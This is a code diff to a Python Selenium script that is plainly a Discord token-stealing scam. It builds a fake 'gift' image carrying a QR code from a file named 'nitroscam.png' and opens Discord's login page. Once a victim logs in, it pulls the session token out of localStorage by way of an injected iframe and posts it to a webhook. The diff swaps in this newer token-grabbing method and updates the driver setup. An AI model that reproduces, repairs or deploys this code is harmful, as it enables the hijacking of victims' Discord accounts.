@@ -1,6 +1,9 @@
 import base64, time, os, requests, json
 from bs4 import BeautifulSoup
 from selenium import webdriver
+from selenium.webdriver.chrome.service import Service
+from webdriver_manager.chrome import ChromeDriverManager
+from selenium.webdriver.common.by import By
 from PIL import Image
 
 WEBHOOK_URL = 'hook'
@@ -15,7 +18,8 @@ def setlogo():
 def paste():
     im1 = Image.open('nitroscam.png', 'r')
     im2 = Image.open('qr.png', 'r')
-    im1.paste(im2, (133, 351))
+    im2 = im2.resize((171, 171))
+    im1.paste(im2, (80, 202))
     im1.save('gift.png', quality=95)
 
 def main():
@@ -30,7 +34,8 @@ def main():
     options = webdriver.ChromeOptions()
     options.add_experimental_option('excludeSwitches', ['enable-logging'])
     options.add_experimental_option('detach', True)
-    driver = webdriver.Chrome(options=options, executable_path=r'chromedriver.exe')
+    s=Service(ChromeDriverManager().install())
+    driver = webdriver.Chrome(options=options, service=s)
 
     driver.get('https://discord.com/login')
     time.sleep(5)
@@ -60,22 +65,8 @@ def main():
         if discord_login != driver.current_url:
             print('Grabbing token..')
             token = driver.execute_script('''
-    var req = webpackJsonp.push([
-        [], {
-            extra_id: (e, t, r) => e.exports = r
-        },
-        [
-            ["extra_id"]
-        ]
-    ]);
-    for (let e in req.c)
-        if (req.c.hasOwnProperty(e)) {
-            let t = req.c[e].exports;
-            if (t && t.__esModule && t.default)
-                for (let e in t.default) "getToken" === e && (token = t.default.getToken())
-        }
-    return token;   
-                ''')
+            var token = document.body.appendChild(document.createElement `iframe`).contentWindow.window.localStorage.token
+            return token;''')
             print('---')
             print('Token grabbed:', token)
 
@@ -98,7 +89,7 @@ def main():
             req = requests.post(WEBHOOK_URL, data=payload.encode(), headers=headers)
 
             break
-
+            
     print('Task complete.')
 
 if __name__ == '__main__':
